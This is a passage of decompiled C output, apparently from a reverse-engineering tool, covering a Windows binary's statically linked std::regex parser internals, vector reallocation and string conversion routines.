    puVar4 = (undefined8 *)operator_new(0x28);
    puVar9 = puVar8;
    if (puVar4 != (undefined8 *)0x0) {
      puVar4[1] = 0x13;
      puVar4[2] = 0;
      puVar4[3] = 0;
      *puVar4 = std::_Node_end_rep::vftable;
      puVar4[4] = 0;
      puVar9 = puVar4;
    }
    puVar4 = (undefined8 *)operator_new(0x38);
    if (puVar4 != (undefined8 *)0x0) {
      iVar1 = *(int *)(*param_1 + 0x24);
      *(int *)(*param_1 + 0x24) = iVar1 + 1;
      *(undefined4 *)(puVar4 + 1) = 0x12;
      *(undefined4 *)((longlong)puVar4 + 0x34) = 0xffffffff;
      *(uint *)((longlong)puVar4 + 0xc) = (uint)param_4 * 2;
      *puVar4 = std::_Node_rep::vftable;
      puVar4[2] = 0;
      puVar4[3] = 0;
      *(int *)(puVar4 + 4) = param_2;
      *(int *)((longlong)puVar4 + 0x24) = param_3;
      puVar4[5] = puVar9;
      *(int *)(puVar4 + 6) = iVar1;
      puVar8 = puVar4;
    }
    puVar9[4] = puVar8;
    FUN_14000a578((longlong)param_1,(longlong)puVar9);
    FUN_14000a2d8(lVar10,(longlong)puVar8);
  }
  return;
}



void FUN_140008180(longlong param_1)

{
  undefined8 *puVar1;
  undefined8 *puVar2;
  
  puVar1 = (undefined8 *)operator_new(0x30);
  puVar2 = (undefined8 *)0x0;
  if (puVar1 != (undefined8 *)0x0) {
    puVar1[1] = 6;
    *puVar1 = std::_Node_str<char>::vftable;
    puVar1[2] = 0;
    puVar1[3] = 0;
    puVar1[4] = 0;
    puVar1[5] = 0;
    puVar2 = puVar1;
  }
  FUN_14000a578(param_1,(longlong)puVar2);
  return;
}



void FUN_1400081d8(longlong param_1)

{
  FUN_14000ac30(param_1,4);
  return;
}



void FUN_1400081e4(char **param_1)

{
  code *pcVar1;
  undefined8 uVar2;
  int iVar3;
  
  iVar3 = *(int *)((longlong)param_1 + 0x7c);
  do {
    if ((iVar3 == -1) || (iVar3 == 0x7c)) {
      return;
    }
    if (iVar3 == 0x29) {
      if (*(int *)((longlong)param_1 + 0x1c) != 0) {
        return;
      }
      if ((*(uint *)(param_1 + 0x10) & 0x10000000) == 0) {
        FUN_140009e2c(param_1,5);
        pcVar1 = (code *)swi(3);
        (*pcVar1)();
        return;
      }
LAB_14000822a:
      if ((iVar3 == 0x5d) && ((*(uint *)(param_1 + 0x10) & 0x10000000) == 0)) {
        FUN_140009e2c(param_1,4);
        pcVar1 = (code *)swi(3);
        (*pcVar1)();
        return;
      }
LAB_14000823b:
      FUN_1400077d0((longlong)(param_1 + 8),*(char *)(param_1 + 0xf));
LAB_140008247:
      FUN_14000ac88(param_1);
LAB_14000824f:
      FUN_14000af88(param_1);
    }
    else {
      if (iVar3 == 0x2e) {
        FUN_140007a58((longlong)(param_1 + 8));
        goto LAB_140008247;
      }
      if (iVar3 != 0x5c) {
        if (iVar3 == 0x5b) {
          FUN_14000ac88(param_1);
          FUN_140008b1c(param_1);
          FUN_140009e38(param_1,0x5d,4);
        }
        else {
          if (iVar3 != 0x28) {
            if (iVar3 == 0x5e) {
              FUN_1400077c4((longlong)(param_1 + 8));
            }
            else {
              if (iVar3 != 0x24) {
                if (((iVar3 - 0x2aU < 2) || (iVar3 == 0x3f)) || (iVar3 == 0x7b)) {
                  FUN_140009e2c(param_1,10);
                  pcVar1 = (code *)swi(3);
                  (*pcVar1)();
                  return;
                }
                if (iVar3 != 0x7d) goto LAB_14000822a;
                if ((*(uint *)(param_1 + 0x10) & 0x10000000) == 0) {
                  FUN_140009e2c(param_1,6);
                  pcVar1 = (code *)swi(3);
                  (*pcVar1)();
                  return;
                }
                goto LAB_14000823b;
              }
              FUN_140007b58((longlong)(param_1 + 8));
            }
            goto LAB_140008297;
          }
          FUN_14000ac88(param_1);
          uVar2 = FUN_14000b9ac(param_1);
          FUN_140009e38(param_1,0x29,5);
          if ((char)uVar2 == '\0') goto LAB_140008257;
        }
        goto LAB_14000824f;
      }
      FUN_14000ac88(param_1);
      if ((*(byte *)(param_1 + 0x10) & 0x80) == 0) {
LAB_1400082b9:
        FUN_1400083b4(param_1);
        goto LAB_14000824f;
      }
      if (*(char *)(param_1 + 0xf) == 'b') {
        FUN_1400081d8((longlong)(param_1 + 8));
      }
      else {
        if (*(char *)(param_1 + 0xf) != 'B') goto LAB_1400082b9;
        FUN_1400081d8((longlong)(param_1 + 8));
        FUN_14000ac24((longlong)(param_1 + 8));
      }
LAB_140008297:
      FUN_14000ac88(param_1);
    }
LAB_140008257:
    iVar3 = *(int *)((longlong)param_1 + 0x7c);
  } while( true );
}



void FUN_1400083b4(char **param_1)

{
  uint uVar1;
  code *pcVar2;
  bool bVar3;
  ushort uVar4;
  ulonglong uVar5;
  char *pcVar6;
  
  if (((*(uint *)(param_1 + 0x10) & 0x100) == 0) ||
     (uVar5 = FUN_14000935c(param_1,3), (char)uVar5 == '\0')) {
    bVar3 = FUN_140008c20(param_1);
    if (!bVar3) {
      if (((*(uint *)(param_1 + 0x10) & 0x20000) != 0) &&
         (uVar4 = FUN_140008b84(param_1,'\x01'), (char)uVar4 != '\0')) {
        return;
      }
      goto LAB_140008488;
    }
  }
  else {
    uVar1 = *(uint *)((longlong)param_1 + 0x74);
    pcVar6 = (char *)(longlong)(int)uVar1;
    if (uVar1 != 0) {
      if (((((*(uint *)(param_1 + 0x10) >> 9 & 1) == 0) || (uVar1 < 10)) &&
          (pcVar6 <= (char *)(ulonglong)*(uint *)(param_1 + 3))) &&
         ((pcVar6 <= param_1[7] && param_1[7] != pcVar6 &&
          ((*(uint *)(param_1[4] + ((ulonglong)pcVar6 >> 5) * 4) & 1 << ((byte)uVar1 & 0x1f)) != 0))
         )) {
        FUN_140007768((longlong)(param_1 + 8),uVar1);
        return;
      }
      FUN_140009e2c(param_1,3);
      pcVar2 = (code *)swi(3);
      (*pcVar2)();
      return;
    }
    if ((*(uint *)(param_1 + 0x10) >> 0x14 & 1) == 0) {
LAB_140008488:
      FUN_140009e2c(param_1,2);
      pcVar2 = (code *)swi(3);
      (*pcVar2)();
      return;
    }
  }
  FUN_1400077d0((longlong)(param_1 + 8),*(char *)((longlong)param_1 + 0x74));
  return;
}



void FUN_140008498(void **param_1)

{
  void *_Src;
  void *_Memory;
  
  _Src = *param_1;
  memcpy(param_1,_Src,(longlong)param_1[2] + 1);
  _Memory = _Src;
  if ((0xfff < (longlong)param_1[3] + 1U) &&
     (_Memory = *(void **)((longlong)_Src + -8),
     0x1f < (ulonglong)((longlong)_Src + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
    _invalid_parameter_noinfo_noreturn();
  }
  free(_Memory);
  param_1[3] = (void *)0xf;
  return;
}



longlong FUN_140008504(undefined8 param_1,longlong param_2)

{
  uint uVar1;
  uint7 uVar2;
  
  uVar1 = *(uint *)(param_2 + 8);
  uVar2 = (uint7)(uint3)(uVar1 >> 8);
  if ((uVar1 < 0x15) && ((0x102100U >> (uVar1 & 0x1f) & 1) != 0)) {
    return CONCAT71(uVar2,1);
  }
  return (ulonglong)uVar2 << 8;
}



ulonglong FUN_14000851c(longlong param_1)

{
  longlong lVar1;
  ulonglong uVar2;
  byte bVar3;
  
  lVar1 = *(longlong *)(param_1 + 8);
  uVar2 = FUN_140008504(param_1,lVar1);
  bVar3 = 0;
  if ((char)uVar2 == '\0') {
    if (*(int *)(lVar1 + 8) != 2) goto LAB_140008558;
    uVar2 = FUN_140008504(param_1,*(longlong *)(lVar1 + 0x18));
    if ((char)uVar2 == '\0') goto LAB_140008558;
  }
  bVar3 = 1;
LAB_140008558:
  return uVar2 & 0xffffffffffffff00 | (ulonglong)bVar3;
}



undefined8 * FUN_14000856c(longlong param_1,byte param_2)

{
  undefined8 *puVar1;
  undefined8 *puVar2;
  
  puVar1 = (undefined8 *)operator_new(0x28);
  if (puVar1 == (undefined8 *)0x0) {
    puVar1 = (undefined8 *)0x0;
  }
  else {
    *(uint *)(puVar1 + 1) = param_2 + 10;
    *(undefined4 *)((longlong)puVar1 + 0xc) = 0;
    puVar1[2] = 0;
    puVar1[3] = 0;
    *puVar1 = std::_Node_assert::vftable;
    puVar1[4] = 0;
  }
  puVar2 = (undefined8 *)operator_new(0x20);
  if (puVar2 == (undefined8 *)0x0) {
    puVar2 = (undefined8 *)0x0;
  }
  else {
    *puVar2 = std::_Node_base::vftable;
    *(undefined4 *)(puVar2 + 1) = 1;
    *(undefined4 *)((longlong)puVar2 + 0xc) = 0;
    puVar2[2] = 0;
    puVar2[3] = 0;
  }
  FUN_14000a578(param_1,(longlong)puVar1);
  puVar1[4] = puVar2;
  puVar2[3] = puVar1;
  *(undefined8 **)(param_1 + 8) = puVar2;
  return puVar1;
}



void FUN_140008628(longlong param_1,undefined4 param_2)

{
  undefined8 *puVar1;
  undefined8 *puVar2;
  
  puVar1 = (undefined8 *)operator_new(0x28);
  puVar2 = (undefined8 *)0x0;
  if (puVar1 != (undefined8 *)0x0) {
    puVar1[2] = 0;
    puVar1[3] = 0;
    *puVar1 = std::_Node_capture::vftable;
    puVar1[1] = 0xd;
    *(undefined4 *)(puVar1 + 4) = param_2;
    puVar2 = puVar1;
  }
  FUN_14000a578(param_1,(longlong)puVar2);
  return;
}



void FUN_140008684(longlong param_1)

{
  FUN_14000ac30(param_1,8);
  return;
}



undefined8 * FUN_140008690(longlong param_1,longlong param_2)

{
  undefined8 *puVar1;
  undefined8 *puVar2;
  
  puVar1 = (undefined8 *)operator_new(0x20);
  if (puVar1 == (undefined8 *)0x0) {
    puVar1 = (undefined8 *)0x0;
  }
  else {
    *(undefined4 *)((longlong)puVar1 + 0xc) = 0;
    puVar1[2] = 0;
    puVar1[3] = 0;
    *(undefined4 *)(puVar1 + 1) = 0x11;
    *puVar1 = std::_Node_endif::vftable;
  }
  FUN_14000a578(param_1,(longlong)puVar1);
  puVar2 = (undefined8 *)operator_new(0x30);
  if (puVar2 != (undefined8 *)0x0) {
    *(undefined4 *)((longlong)puVar2 + 0xc) = 0;
    puVar2[2] = 0;
    puVar2[3] = 0;
    puVar2[5] = 0;
    *puVar2 = std::_Node_if::vftable;
    *(undefined4 *)(puVar2 + 1) = 0x10;
    puVar2[4] = puVar1;
  }
  FUN_14000a2d8(*(longlong *)(param_2 + 0x10),(longlong)puVar2);
  return puVar1;
}



ulonglong FUN_140008748(longlong param_1)

{
  uint uVar1;
  undefined4 extraout_var;
  longlong lVar3;
  longlong lVar4;
  ulonglong uVar5;
  uint uVar6;
  ulonglong uVar2;
  
  uVar5 = 0;
  uVar1 = FUN_140009fd8(param_1);
  uVar2 = CONCAT44(extraout_var,uVar1);
  if (uVar1 != 0) {
    do {
      uVar6 = 1 << ((byte)uVar5 & 0x1f);
      if (((*(uint *)(*(longlong *)(param_1 + 0x48) + (uVar5 >> 5) * 4) & uVar6) != 0) &&
         (uVar2 = *(ulonglong *)(param_1 + 8), (*(uint *)(uVar2 + (uVar5 >> 5) * 4) & uVar6) != 0))
      {
        uVar2 = *(ulonglong *)(param_1 + 0x68);
        lVar3 = *(longlong *)(uVar2 + uVar5 * 0x10);
        lVar4 = *(longlong *)(*(longlong *)(param_1 + 0x28) + uVar5 * 0x10);
        if (lVar3 != lVar4) {
LAB_1400087ca:
          uVar2 = *(ulonglong *)(param_1 + 0x98);
          return uVar2 & 0xffffffffffffff00 |
                 (ulonglong)((longlong)(lVar3 - uVar2) < (longlong)(lVar4 - uVar2));
        }
        lVar3 = *(longlong *)(uVar2 + 8 + uVar5 * 0x10);
        lVar4 = *(longlong *)(*(longlong *)(param_1 + 0x28) + 8 + uVar5 * 0x10);
        if (lVar3 != lVar4) goto LAB_1400087ca;
      }
      uVar6 = (int)uVar5 + 1;
      uVar5 = (ulonglong)uVar6;
    } while (uVar6 < uVar1);
  }
  return uVar2 & 0xffffffffffffff00;
}



void FUN_1400087e0(longlong param_1,longlong param_2,longlong param_3)

{
  int iVar1;
  longlong lVar2;
  longlong lVar3;
  
  if (param_1 != param_2) {
    do {
      if (param_1 == 0) {
        return;
      }
      iVar1 = *(int *)(param_1 + 8);
      lVar3 = param_3;
      if ((iVar1 == 10) || (iVar1 == 0xb)) {
        FUN_1400087e0(*(longlong *)(param_1 + 0x20),0,0);
      }
      else if (iVar1 == 0x10) {
        if (param_3 != 0) {
          *(undefined4 *)(param_3 + 0x34) = 0;
        }
        for (lVar2 = *(longlong *)(param_1 + 0x28); lVar2 != 0; lVar2 = *(longlong *)(lVar2 + 0x28))
        {
          FUN_1400087e0(*(longlong *)(lVar2 + 0x10),*(longlong *)(lVar2 + 0x20),param_3);
        }
      }
      else if (iVar1 == 0x12) {
        lVar3 = param_1;
        if (param_3 != 0) {
          *(undefined4 *)(param_3 + 0x34) = 0;
          *(undefined4 *)(param_1 + 0x34) = 0;
          lVar3 = param_3;
        }
      }
      else if ((iVar1 == 0x13) && (param_3 == *(longlong *)(param_1 + 0x20))) {
        if (*(int *)(param_3 + 0x34) == -1) {
          *(undefined4 *)(param_3 + 0x34) = 1;
        }
        lVar3 = 0;
      }
      param_1 = *(longlong *)(param_1 + 0x10);
      param_3 = lVar3;
    } while (param_1 != param_2);
  }
  return;
}



void FUN_140008a78(undefined8 param_1,undefined *param_2,undefined *param_3,uint param_4,
                  uint **param_5)

{
  undefined uVar1;
  uint uVar2;
  uint *puVar3;
  code *pcVar4;
  void *pvVar5;
  uint *puVar6;
  
  puVar3 = *param_5;
  do {
    if (puVar3 == (uint *)0x0) {
LAB_140008ac4:
      puVar6 = (uint *)operator_new(0x20);
      if (puVar6 != (uint *)0x0) {
        *puVar6 = param_4;
        puVar6[2] = 0;
        puVar6[3] = 0;
        *(undefined8 *)(puVar6 + 4) = 0;
      }
      *param_5 = puVar6;
      *(uint **)(puVar6 + 6) = puVar3;
LAB_140008aee:
      puVar3 = *param_5;
      puVar6 = puVar3 + 2;
      if (param_2 != param_3) {
        do {
          uVar1 = *param_2;
          param_2 = param_2 + 1;
          uVar2 = puVar3[3];
          if (*puVar6 < uVar2 || *puVar6 == uVar2) {
            pvVar5 = realloc(*(void **)(puVar3 + 4),(ulonglong)(uVar2 + 0x10));
            if (pvVar5 == (void *)0x0) {
              std::_Xbad_alloc();
              pcVar4 = (code *)swi(3);
              (*pcVar4)();
              return;
            }
            *(void **)(puVar3 + 4) = pvVar5;
            *puVar6 = uVar2 + 0x10;
          }
          *(undefined *)((ulonglong)puVar3[3] + *(longlong *)(puVar3 + 4)) = uVar1;
          puVar3[3] = puVar3[3] + 1;
        } while (param_2 != param_3);
      }
      return;
    }
    if (*puVar3 <= param_4) {
      if (param_4 == *puVar3) goto LAB_140008aee;
      goto LAB_140008ac4;
    }
    param_5 = (uint **)(puVar3 + 6);
    puVar3 = *param_5;
  } while( true );
}



void FUN_140008b1c(char **param_1)

{
  char **ppcVar1;
  
  ppcVar1 = param_1 + 8;
  FUN_1400079d4((longlong)ppcVar1);
  if (*(int *)((longlong)param_1 + 0x7c) == 0x5e) {
    FUN_14000ac24((longlong)ppcVar1);
    FUN_14000ac88(param_1);
  }
  if (((*(uint *)(param_1 + 0x10) & 0x20000000) != 0) &&
     (*(int *)((longlong)param_1 + 0x7c) == 0x5d)) {
    thunk_FUN_14000793c((longlong)ppcVar1,0x5d);
    FUN_14000ac88(param_1);
  }
  FUN_140008ed4(param_1);
  return;
}



ushort FUN_140008b84(char **param_1,char param_2)

{
  char *pcVar1;
  ushort in_AX;
  undefined extraout_AH;
  
  pcVar1 = *param_1;
  if ((pcVar1 != param_1[2]) &&
     (in_AX = FUN_140004b10((longlong)param_1[0xd],pcVar1,pcVar1 + 1,
                            (byte)((uint)*(undefined4 *)(param_1 + 0xe) >> 8) & 1), in_AX != 0)) {
    if (param_2 != '\0') {
      FUN_1400079d4((longlong)(param_1 + 8));
    }
    FUN_140007cfc((longlong)(param_1 + 8),in_AX,
                  *(byte *)(*(longlong *)(*(longlong *)(param_1[0xd] + 8) + 0x18) +
                           (ulonglong)*(byte *)(param_1 + 0xf) * 2) & 1);
    FUN_14000ac88(param_1);
    return CONCAT11(extraout_AH,1);
  }
  return in_AX & 0xff00;
}



bool FUN_140008c20(char **param_1)

{
  char **ppcVar1;
  byte bVar2;
  code *pcVar3;
  char cVar4;
  bool bVar5;
  undefined uVar6;
  uint uVar7;
  ulonglong uVar8;
  
  if (*(int *)((longlong)param_1 + 0x7c) == -1) goto LAB_140008d54;
  ppcVar1 = param_1 + 0xf;
  if ((((*(uint *)(param_1 + 0x10) & 0x10000) == 0) ||
      (cVar4 = FUN_1400097fc((longlong)param_1,*(byte *)ppcVar1), cVar4 == '\0')) &&
     (((*(uint *)(param_1 + 0x10) & 0x8000) == 0 ||
      (uVar8 = FUN_140009848((longlong)param_1,*(byte *)ppcVar1), (char)uVar8 == '\0')))) {
    bVar2 = *(byte *)ppcVar1;
    if (bVar2 == 99) {
      if ((*(uint *)(param_1 + 0x10) & 0x40000) == 0) goto LAB_140008d0f;
      FUN_14000ac88(param_1);
      if ((*(ushort *)
            (*(longlong *)(*(longlong *)(param_1[0xd] + 8) + 0x18) + (ulonglong)*(byte *)ppcVar1 * 2
            ) & 0x103) == 0) goto LAB_140008d54;
      uVar7 = (int)(char)*(byte *)ppcVar1 & 0x8000001f;
      if ((int)uVar7 < 0) {
        uVar7 = (uVar7 - 1 | 0xffffffe0) + 1;
      }
      *(int *)((longlong)param_1 + 0x74) = (int)(char)uVar7;
      goto LAB_140008cbf;
    }
    if (bVar2 == 0x78) {
      if ((*(uint *)(param_1 + 0x10) & 0x1000) != 0) {
        FUN_14000ac88(param_1);
        uVar7 = 2;
        goto LAB_140008d05;
      }
LAB_140008d0f:
      if (((*(uint *)(param_1 + 0x10) & 0x2000) == 0) ||
         (uVar8 = FUN_14000acd8(param_1), (char)uVar8 == '\0')) {
        bVar5 = FUN_14000a170(param_1);
        return bVar5;
      }
      if (*(int *)((longlong)param_1 + 0x74) == 0) goto LAB_140008d54;
    }
    else {
      if ((bVar2 != 0x75) || ((*(uint *)(param_1 + 0x10) & 0x800) == 0)) goto LAB_140008d0f;
      FUN_14000ac88(param_1);
      uVar7 = 4;
LAB_140008d05:
      FUN_14000a13c(param_1,uVar7);
    }
  }
  else {
LAB_140008cbf:
    FUN_14000ac88(param_1);
  }
  if (*(uint *)((longlong)param_1 + 0x74) < 0x100) {
    *(int *)((longlong)param_1 + 0x74) = (int)*(char *)((longlong)param_1 + 0x74);
    return true;
  }
LAB_140008d54:
  FUN_140009e2c(param_1,2);
  pcVar3 = (code *)swi(3);
  uVar6 = (*pcVar3)();
  return (bool)uVar6;
}



ulonglong FUN_140008d64(char **param_1)

{
  int iVar1;
  uint uVar2;
  char cVar3;
  ulonglong uVar4;
  
  iVar1 = *(int *)((longlong)param_1 + 0x7c);
  if (iVar1 == 0x5c) {
    FUN_14000ac88(param_1);
    if ((*(uint *)(param_1 + 0x10) >> 0x15 & 1) != 0) {
      uVar4 = FUN_140008e48(param_1,'\0');
      return uVar4;
    }
    if ((((*(uint *)(param_1 + 0x10) >> 0x10 & 1) == 0) ||
        (cVar3 = FUN_1400097fc((longlong)param_1,*(char *)(param_1 + 0xf)), cVar3 == '\0')) &&
       (((*(uint *)(param_1 + 0x10) & 0x8000) == 0 ||
        (uVar4 = FUN_140009848((longlong)param_1,*(char *)(param_1 + 0xf)), (char)uVar4 == '\0'))))
    {
      *(undefined4 *)((longlong)param_1 + 0x74) = 0x5c;
      return 1;
    }
  }
  else {
    if (iVar1 == 0x5b) {
      FUN_14000ac88(param_1);
      uVar2 = *(uint *)((longlong)param_1 + 0x7c);
      if ((uVar2 < 0x3e) && ((0x2400400000000000U >> ((longlong)(int)uVar2 & 0x3fU) & 1) != 0)) {
        FUN_14000ac88(param_1);
        FUN_1400096ac(param_1,uVar2);
        return 2;
      }
      *(undefined4 *)((longlong)param_1 + 0x74) = 0x5b;
      return 1;
    }
    if ((iVar1 == 0x5d) || (iVar1 == -1)) {
      return 0;
    }
    *(int *)((longlong)param_1 + 0x74) = (int)*(char *)(param_1 + 0xf);
  }
  FUN_14000ac88(param_1);
  return 1;
}



ulonglong FUN_140008e48(char **param_1,char param_2)

{
  code *pcVar1;
  bool bVar2;
  ushort uVar3;
  ulonglong uVar4;
  
  if (((*(uint *)(param_1 + 0x10) >> 0xe & 1) == 0) || (*(char *)(param_1 + 0xf) != '\\')) {
    if (((*(uint *)(param_1 + 0x10) >> 0x11 & 1) != 0) &&
       (uVar3 = FUN_140008b84(param_1,param_2), (char)uVar3 != '\0')) {
      return 2;
    }
    uVar4 = FUN_14000935c(param_1,2);
    if ((char)uVar4 == '\0') {
      bVar2 = FUN_140008c20(param_1);
      return (ulonglong)bVar2;
    }
    if (*(int *)((longlong)param_1 + 0x74) != 0) {
      FUN_140009e2c(param_1,2);
      pcVar1 = (code *)swi(3);
      uVar4 = (*pcVar1)();
      return uVar4;
    }
  }
  else {
    *(undefined4 *)((longlong)param_1 + 0x74) = 0x5c;
    FUN_14000ac88(param_1);
  }
  return 1;
}



void FUN_140008ed4(char **param_1)

{
  code *pcVar1;
  char cVar2;
  byte bVar3;
  ulonglong uVar4;
  
  while( true ) {
    while( true ) {
      do {
        uVar4 = FUN_140008d64(param_1);
        if ((int)uVar4 == 0) {
          return;
        }
      } while ((int)uVar4 == 2);
      if ((*(int *)((longlong)param_1 + 0x74) == 0) && ((*(uint *)(param_1 + 0x10) & 0x100000) == 0)
         ) {
        FUN_140009e2c(param_1,2);
        pcVar1 = (code *)swi(3);
        (*pcVar1)();
        return;
      }
      if (*(int *)((longlong)param_1 + 0x7c) == 0x2d) break;
      thunk_FUN_14000793c((longlong)(param_1 + 8),*(byte *)((longlong)param_1 + 0x74));
    }
    FUN_14000ac88(param_1);
    bVar3 = *(byte *)((longlong)param_1 + 0x74);
    uVar4 = FUN_140008d64(param_1);
    if ((int)uVar4 == 0) {
      thunk_FUN_14000793c((longlong)(param_1 + 8),*(byte *)((longlong)param_1 + 0x74));
      thunk_FUN_14000793c((longlong)(param_1 + 8),0x2d);
      return;
    }
    if ((int)uVar4 == 2) break;
    if ((*(uint *)(param_1 + 0xe) & 0x800) != 0) {
      cVar2 = FUN_14000cf04((longlong **)param_1[0xd],*(undefined *)((longlong)param_1 + 0x74));
      *(int *)((longlong)param_1 + 0x74) = (int)cVar2;
      bVar3 = FUN_14000cf04((longlong **)param_1[0xd],bVar3);
    }
    if (*(byte *)((longlong)param_1 + 0x74) < bVar3) break;
    FUN_140007d0c((longlong)(param_1 + 8),bVar3,*(byte *)((longlong)param_1 + 0x74));
  }
  FUN_140009e2c(param_1,8);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void FUN_140008fc0(void **param_1,ulonglong param_2)

{
  void *pvVar1;
  code *pcVar2;
  void *pvVar3;
  void *_Memory;
  ulonglong uVar4;
  ulonglong uVar5;
  
  if (0x3fffffffffffffff < param_2) {
    FUN_14000ba74();
    pcVar2 = (code *)swi(3);
    (*pcVar2)();
    return;
  }
  pvVar1 = *param_1;
  uVar4 = (longlong)param_1[2] - (longlong)pvVar1 >> 2;
  if (0x3fffffffffffffff - (uVar4 >> 1) < uVar4) {
    uVar5 = 0x3fffffffffffffff;
  }
  else {
    uVar5 = (uVar4 >> 1) + uVar4;
    if (uVar5 < param_2) {
      uVar5 = param_2;
    }
  }
  pvVar3 = (void *)0x0;
  if (pvVar1 != (void *)0x0) {
    _Memory = pvVar1;
    if ((0xfff < uVar4 << 2) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(_Memory);
    *param_1 = (void *)0x0;
    param_1[1] = (void *)0x0;
    param_1[2] = (void *)0x0;
  }
  if (uVar5 < 0x4000000000000000) {
    uVar5 = uVar5 * 4;
    if (uVar5 < 0x1000) {
      if (uVar5 != 0) {
        pvVar3 = operator_new(uVar5);
      }
    }
    else {
      pvVar3 = std::_Allocate_manually_vector_aligned_struct_std___Default_allocate_traits_(uVar5);
    }
    *param_1 = pvVar3;
    param_1[1] = pvVar3;
    param_1[2] = (void *)(uVar5 + (longlong)pvVar3);
    return;
  }
  FUN_14000b454();
  pcVar2 = (code *)swi(3);
  (*pcVar2)();
  return;
}



void FUN_1400090bc(void **param_1,ulonglong param_2)

{
  void *pvVar1;
  code *pcVar2;
  void *pvVar3;
  void *_Memory;
  ulonglong uVar4;
  ulonglong uVar5;
  
  if (0xfffffffffffffff < param_2) {
    FUN_14000ba74();
    pcVar2 = (code *)swi(3);
    (*pcVar2)();
    return;
  }
  pvVar1 = *param_1;
  uVar4 = (longlong)param_1[2] - (longlong)pvVar1 >> 4;
  if (0xfffffffffffffff - (uVar4 >> 1) < uVar4) {
    uVar5 = 0xfffffffffffffff;
  }
  else {
    uVar5 = (uVar4 >> 1) + uVar4;
    if (uVar5 < param_2) {
      uVar5 = param_2;
    }
  }
  pvVar3 = (void *)0x0;
  if (pvVar1 != (void *)0x0) {
    _Memory = pvVar1;
    if ((0xfff < uVar4 << 4) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(_Memory);
    *param_1 = (void *)0x0;
    param_1[1] = (void *)0x0;
    param_1[2] = (void *)0x0;
  }
  if (uVar5 < 0x1000000000000000) {
    uVar5 = uVar5 * 0x10;
    if (uVar5 < 0x1000) {
      if (uVar5 != 0) {
        pvVar3 = operator_new(uVar5);
      }
    }
    else {
      pvVar3 = std::_Allocate_manually_vector_aligned_struct_std___Default_allocate_traits_(uVar5);
    }
    *param_1 = pvVar3;
    param_1[1] = pvVar3;
    param_1[2] = (void *)(uVar5 + (longlong)pvVar3);
    return;
  }
  FUN_14000b454();
  pcVar2 = (code *)swi(3);
  (*pcVar2)();
  return;
}



longlong FUN_1400091b8(char **param_1)

{
  char **ppcVar1;
  code *pcVar2;
  longlong lVar3;
  
  ppcVar1 = param_1 + 8;
  lVar3 = FUN_140008628((longlong)ppcVar1,0);
  FUN_140009380(param_1);
  if (*param_1 == param_1[2]) {
    FUN_140009d8c((longlong)ppcVar1,lVar3);
    lVar3 = FUN_140009e10(ppcVar1);
    *(undefined4 *)(lVar3 + 0x20) = *(undefined4 *)(param_1 + 0xe);
    *(int *)(lVar3 + 0x28) = *(int *)(param_1 + 3) + 1;
    FUN_1400087e0(lVar3,0,0);
    return lVar3;
  }
  FUN_140009e2c(param_1,0xe);
  pcVar2 = (code *)swi(3);
  lVar3 = (*pcVar2)();
  return lVar3;
}



undefined (*) [16] FUN_140009244(undefined (*param_1) [16],UINT param_2,LPCSTR *param_3)

{
  LPCSTR pCVar1;
  code *pcVar2;
  int iVar3;
  int iVar4;
  undefined8 uVar5;
  undefined (*pauVar6) [16];
  ulonglong uVar7;
  
  *param_1 = ZEXT816(0);
  *(undefined8 *)param_1[1] = 0;
  *(undefined8 *)(param_1[1] + 8) = 7;
  *(undefined2 *)*param_1 = 0;
  if (param_3[1] != (LPCSTR)0x0) {
    if ((LPCSTR)0x7fffffff < param_3[1]) {
      FUN_14000b4e8(0x16);
      pcVar2 = (code *)swi(3);
      pauVar6 = (undefined (*) [16])(*pcVar2)();
      return pauVar6;
    }
    iVar4 = *(int *)(param_3 + 1);
    pCVar1 = *param_3;
    uVar5 = __std_fs_convert_narrow_to_wide(param_2,pCVar1,iVar4,(LPWSTR)0x0,0);
    iVar3 = (int)((ulonglong)uVar5 >> 0x20);
    if (iVar3 != 0) {
      FUN_14000b524(iVar3);
      pcVar2 = (code *)swi(3);
      pauVar6 = (undefined (*) [16])(*pcVar2)();
      return pauVar6;
    }
    uVar7 = (ulonglong)(int)uVar5;
    if (uVar7 < *(ulonglong *)param_1[1] || uVar7 == *(ulonglong *)param_1[1]) {
      pauVar6 = param_1;
      if (7 < *(ulonglong *)(param_1[1] + 8)) {
        pauVar6 = *(undefined (**) [16])*param_1;
      }
      *(ulonglong *)param_1[1] = uVar7;
      *(undefined2 *)(*pauVar6 + uVar7 * 2) = 0;
    }
    else {
      FUN_14000bc0c((void **)param_1,uVar7 - *(longlong *)param_1[1],0);
    }
    pauVar6 = param_1;
    if (7 < *(ulonglong *)(param_1[1] + 8)) {
      pauVar6 = *(undefined (**) [16])*param_1;
    }
    uVar5 = __std_fs_convert_narrow_to_wide(param_2,pCVar1,iVar4,(LPWSTR)pauVar6,(int)uVar5);
    iVar4 = (int)((ulonglong)uVar5 >> 0x20);
    if (iVar4 != 0) {
      FUN_14000b524(iVar4);
      pcVar2 = (code *)swi(3);
      pauVar6 = (undefined (*) [16])(*pcVar2)();
      return pauVar6;
    }
  }
  return param_1;
}



ulonglong FUN_14000935c(char **param_1,error_type param_2)

{
  ulonglong uVar1;
  
  uVar1 = FUN_1400095fc(param_1,10,0x7fffffff,param_2);
  return uVar1 & 0xffffffffffffff00 | (ulonglong)((int)uVar1 != 0x7fffffff);
}



void FUN_140009380(char **param_1)

{
  char **ppcVar1;
  char cVar2;
  longlong lVar3;
  longlong lVar4;
  undefined8 *puVar5;
  
  ppcVar1 = param_1 + 8;
  lVar3 = FUN_14000a134((longlong)ppcVar1);
  cVar2 = FUN_1400081e4(param_1);
  if (cVar2 == '\0') {
    if (*(int *)((longlong)param_1 + 0x7c) != 0x7c) {
      return;
    }
    lVar4 = FUN_140008684((longlong)ppcVar1);
    FUN_140009d8c((longlong)ppcVar1,lVar4);
  }
  puVar5 = FUN_140008690((longlong)ppcVar1,lVar3);
  while (*(int *)((longlong)param_1 + 0x7c) == 0x7c) {
    FUN_14000ac88(param_1);
